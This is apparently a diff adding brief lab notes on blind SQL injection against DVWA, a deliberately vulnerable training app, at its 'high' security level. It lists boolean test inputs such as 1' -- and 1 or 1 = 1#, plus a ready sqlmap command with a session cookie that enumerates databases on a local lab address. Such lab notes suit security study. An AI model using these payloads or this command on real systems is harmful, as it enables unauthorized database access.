@@ -1,0 +1,12 @@
+high-level blind sql injection on dvwa : 
+At this level there are differences in how to do input. now the input form is on the cookie-input.php page then the value is set to cookie and the results will be displayed on the index.php page.
+
+1' -- user id exists in the database.
+'  -- user id is missing from the database.
+1 or 1 = 1#      --user id exists in the database.
+
+
+perform the attacks : - 
+sqlmap -u "http://172.17.0.2/vulnerabilities/sqli_blind/?id=1" --cookie="PHPSESSID=jusi9ccuu6qfk9m3tqdf103jo2; security=high" --dbs
+
+
